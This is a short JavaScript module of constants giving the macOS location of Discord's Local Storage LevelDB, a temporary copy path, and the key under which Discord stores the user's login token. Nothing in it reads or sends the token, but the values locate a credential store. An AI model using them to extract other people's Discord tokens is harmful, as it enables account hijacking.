import os from 'node:os';

export const DISCORD_LEVELDB_PATH = `${os.homedir()}/Library/Application Support/discord/Local Storage/leveldb`;
export const DISCORD_LEVELSDB_TEMP_PATH = `${os.tmpdir()}/discord-leveldb-5b8a3726-f19a-4ab8-8097-d09bf04b6cf8`;
export const DISCORD_TOKEN_KEY = '_https://discord.com\x00\x01token';
